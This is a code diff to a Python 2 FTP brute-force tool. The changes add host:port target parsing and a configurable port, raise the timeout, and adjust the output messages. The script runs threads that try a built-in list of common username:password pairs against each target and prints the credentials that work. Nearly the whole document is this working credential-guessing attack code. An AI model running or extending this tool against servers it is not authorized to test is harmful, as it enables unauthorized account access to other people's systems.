@@ -14,8 +14,6 @@ targetList = [
 "127.0.0.1",
 
 
-
-
 ]
 userpwdList = [
     "admin:123456",
@@ -47,29 +45,37 @@ userpwdList = [
 ]
 threadList = []
 threadNum = 10
-timeout=3
+timeout=5
 
-def _bruteLogin(hostname):
+def _bruteLogin(hostname,port=21):
     flag = False
     print "[.] Trying: " + hostname +"\r\n",
     for line in userpwdList:
         username = line.split(':')[0]
         password = line.split(':')[1].strip('\r').strip('\n')
         try:
-            ftp = ftplib.FTP(hostname)
+            ftp = ftplib.FTP()
+            ftp.connect(hostname,port)
             ftp.login(username, password)
-            print '[+] ' + str(hostname) + ': FTP Logon Succeeded: ' + username  + ":" + password  +"\r\n",
+            print '[+] ' + str(hostname) + ":"+ str(port) + ': FTP Login Succeeded: ' + username  + ":" + password  +"\r\n",
             flag = True
             ftp.quit()
         except Exception, e:
             pass
     if not flag :
-        print '[-] Could not brute force FTP credentials for '+ hostname +"\r\n",
+        print '[-] Could not brute force FTP credentials for '+ hostname +":"+ str(port) +"\r\n",
     return (None, None)
 
 def bruteLogin(threadId):
     for i in xrange(threadId,len(targetList),threadNum):
-        dic = _bruteLogin(targetList[i])
+        if ":" in targetList[i]:
+            tal = targetList[i].split(":")
+            hostname = tal[0]
+            port = tal[1]
+            dic = _bruteLogin(hostname,port)
+        else:
+            dic = _bruteLogin(targetList[i])
+        
         
 def scan():
     print "[.] Run start: Total " + str(len(targetList)) + " hosts!"+ "\r\n",
